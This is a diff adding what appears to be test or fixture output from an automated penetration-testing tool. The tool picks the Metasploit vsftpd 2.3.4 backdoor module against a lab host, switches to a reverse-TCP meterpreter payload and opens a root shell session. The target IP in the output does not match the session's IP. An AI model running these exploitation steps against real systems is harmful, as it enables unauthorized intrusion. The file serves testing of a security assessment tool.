@@ -1,0 +1,65 @@
+========================================
+        METASPLOIT EXPLOITATION
+          (authorized lab only)
+========================================
+
+[*] Target:   203.0.113.71
+[*] Findings: /home/kali/security-assessment/tests/runs/20260923_100154/t71/src
+
+Available exploit candidates:
+----------------------------------------
+[1] 21   high   vsftpd 2.3.4  [high/high]  EDB-17491 (EXACT_VERSION_MATCH)
+      vsftpd 2.3.4 - Backdoor Command Execution
+[2] 139  medium Samba smbd 3.0.20-Debian  [medium/medium]  EDB-16320 (VERSION_RANGE_MATCH)
+      Samba 3.0.20 < 3.0.25rc3 - Username map script Command Execution
+[3] 8009 medium Apache Jserv 1.2  [medium/medium]  EDB-30004 (STRONG_PRODUCT_SERVICE_MATCH)
+      Apache Jserv Remote Buffer Overflow
+----------------------------------------
+[*] Candidate index given: selecting candidate 1.
+
+[+] Selected: vsftpd 2.3.4 - Backdoor Command Execution (vsftpd 2.3.4, port 21)
+    Service: ftp | Confidence: high | Match: EXACT_VERSION_MATCH | EDB-17491
+
+[*] Metasploit module: exploit/unix/ftp/vsftpd_234_backdoor
+[*] Payload:          cmd/unix/interact
+[*] Mapping note:     vsftpd 2.3.4 backdoor (classic MS2 lab)
+
+[*] Metasploit build probe:
+    payload 'cmd/unix/interact' -> not accepted; using module default 'cmd/linux/http/x86/meterpreter_reverse_tcp'
+    LHOST -> required by the (effective) payload
+    ExitOnSession -> not supported; option will not be sent
+
+[*] Launching Metasploit (bounded to 120s) - evidence is collected through the same live session...
+/home/kali/security-assessment/modules/exploitation.sh: line 128: $1: unbound variable
+/home/kali/security-assessment/modules/exploitation.sh: line 128: $1: unbound variable
+/home/kali/security-assessment/modules/exploitation.sh: line 128: $1: unbound variable
+/home/kali/security-assessment/modules/exploitation.sh: line 128: $1: unbound variable
+/home/kali/security-assessment/modules/exploitation.sh: line 128: $1: unbound variable
+
+[*] Session detected: command_shell session 1.
+[*] Evidence status:  failed (session existed but was no longer available for evidence collection)
+
+[*] Raw Metasploit output saved:
+    /home/kali/security-assessment/tests/runs/20260923_100154/t71/exploit/203.0.113.71_20260923_100202125857253/exploit_output.txt
+
+----------------------------------------
+Last lines of Metasploit output:
+----------------------------------------
+    [*] Started reverse TCP handler
+    [*] 203.0.113.7:21 - 203.0.113.7:21 - CONNECTED
+    [*] Command shell session 1 opened (192.168.1.11:42101 -> 203.0.113.7:21)
+    [*] Session 1 created.
+    [*] Backgrounding session 1...
+    resource (fake-msf)> sessions -l
+    
+    Active sessions
+    ===============
+    
+      Id  Name  Type            Information                                  Connection
+      --  ----  ----            -----------                                  ----------
+      1        command shell    uid=0, gid=0 (metasploitable)                 192.168.1.11:42101 -> 203.0.113.7:21
+
+[+] SESSION CREATED (command_shell session 1)
+[-] Evidence could not be collected for the session (session existed but was no longer available for evidence collection).
+[-] Phase 5 completed.
+[-] Output directory: /home/kali/security-assessment/tests/runs/20260923_100154/t71/exploit/203.0.113.71_20260923_100202125857253
